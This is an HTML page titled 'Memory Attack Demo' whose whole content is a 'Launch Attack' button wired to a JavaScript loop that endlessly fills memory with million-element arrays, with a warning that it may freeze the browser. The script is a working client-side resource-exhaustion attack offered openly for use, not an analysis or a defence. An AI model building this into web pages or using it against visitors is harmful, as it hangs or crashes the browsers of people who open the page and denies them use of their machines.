<!DOCTYPE html>
<html>
<head>
  <title>Memory Attack</title>
</head>
<body>
  <h1>Memory Attack Demo</h1>
  <p>Warning: This may freeze your browser. Use with caution.</p>
  <button onclick="attack()">Launch Attack</button>

  <script>
    function attack() {
      const memory = [];
      while (true) {
        // Push large arrays into memory endlessly
        memory.push(new Array(1000000).fill("CRASH"));
      }
    }
  </script>
</body>
</html>
